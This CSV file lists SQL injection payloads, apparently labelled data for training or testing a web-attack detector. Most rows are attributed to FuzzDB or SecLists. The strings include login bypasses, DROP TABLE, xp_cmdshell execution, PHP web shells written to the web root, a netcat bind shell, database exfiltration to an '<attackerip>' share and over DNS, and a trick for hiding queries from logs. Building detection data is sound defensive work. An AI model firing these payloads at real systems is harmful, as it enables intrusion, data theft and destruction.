Payload,Signature,AttackType,Severity,MITRE,Label,Description
1' or '1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1' or 1.e(1) or '1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1'/**/AND/**/1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1'/**/OR/**/'1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; DROP TABLE users--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1'; WAITFOR DELAY '00:00:05'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,Advanced SQL Injection variant
1'or'1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1) or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
1) or sleep(__TIME__)#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1)) or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
1)) or sleep(__TIME__)#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1; DROP members--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1;SELECT%20*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1\\'1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1or1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
21 %,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
23 OR 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
26 %,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
28 %,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
29 %,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
3.10E+17,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
; begin declare @var varchar(8000) set @var=' ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; exec ('sel' + 'ect us' + 'er'),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; exec master..xp_cmdshell,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; exec master..xp_cmdshell 'ping 172.10.1.255'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; exec xp_regread,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; execute immediate 'sel' || 'ect us' || 'er',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
; or '1'='1',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
;%00,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
;(select 1 from pg_sleep(5)),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
;waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"<>""'%;)(&+",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
<username>' OR 1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
<username>'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
= 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?#\\0,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%09and%091=1%09--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%0Aand%0A1=1%0A--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%0Band%0B1=1%0B--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%0Cand%0C1=1%0C--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%0Dand%0D1=1%0D--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%A0and%A01=1%A0--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%df',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1%df' and 1=1 --+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
?id=1/*!12345UNION*//*!12345SELECT*/1--,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
@var select @var as var into temp end --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
@variable,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
ADMIN'/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
BACKUP database master to disks='\\\\<attackerip>\\<attackerip>\\backupdb.dat',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
GROUP BY 1--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
GROUP BY 2--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
GROUP BY 3--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
GROUP BY 4--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"INSERT INTO lol.pwn (dataz) VALUES (""<?php system($_GET['cmd']); ?>"");--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
ORDER BY 1--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
ORDER BY 2--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
ORDER BY 3--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
ORDER BY 4--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
PRINT,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
PRINT @@variable,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
SELECT * from pg_largeobject; -- or just get all the large objects and their data,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
SELECT lo_get(16420); -- use the OID returned from the above,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
SELECT schemaname FROM syscat.schemata;,COMMAND_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"SELECT to_char(dbms_xmlgen.getxml('select ""'&#124;&#124;(select user from sys.dual)&#124;&#124;'"" FROM sys.dual')) FROM dual",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
SELECT user FROM dual UNION SELECT * FROM v$version,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION ALL SELECT,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
UNION SELECT,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"UNION SELECT ""<?php system($_GET['cmd'])",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo(),SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION SELECT * FROM (SELECT * FROM users JOIN users b)a,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php'""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
UNION SELECT NULL,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
You have an error in your SQL syntax; ... near '' at line 1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
\\'; desc users; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
\\?#\\0,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
\\x27UNION SELECT,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
a' or 'a' = 'a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
a' or 1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
a' or 3=3--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
a' waitfor delay '0:0:10'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"admin"" #",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" --",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or ""1""=""1",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or ""1""=""1""#",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or ""1""=""1""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or ""1""=""1""/*",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or 1=1",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or 1=1#",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or 1=1--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"" or 1=1/*",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin""#",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"admin"") or ""1""=""1",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or ""1""=""1""#",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or ""1""=""1""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or ""1""=""1""/*",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or (""1""=""1",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or (""1""=""1""#",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or (""1""=""1""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin"") or (""1""=""1""/*",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"admin""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"admin""/*",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"admin""or 1=1 or """"=""",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' #,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' ALLOW FILTERING; %00,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin' OR '1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin' OR '1'='1' ORDER BY password--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,Hackazon admin enumeration
admin' or ',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
admin' or '1'='1'#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or '1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or '1'='1'/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or 1=1#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or 1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin' or 1=1/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin'#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin'#; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin') or '1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or '1'='1'#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or '1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or '1'='1'/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or ('1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or ('1'='1'#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or ('1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin') or ('1'='1'/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin'--; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin'/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
admin'/*; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin'or 1=1 or ''=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
admin@juice-sh.op'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,Juice Shop admin bypass
and 1 in (select var from temp)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
anything' OR 'x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' OR 1=1 LIMIT 1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
bfilename,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
char%4039%41%2b%40SELECT,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
create table myfile (input TEXT);,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\\inetpub\\wwwroot\\auth.asp'"" select * from myfile""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
declare @q nvarchar (200) 0x730065006c00650063 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
declare @q nvarchar (200) select @q = 0x770061 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
declare @q nvarchar (4000) select @q =,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
declare @s varchar (200) select @s = 0x73656c6 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
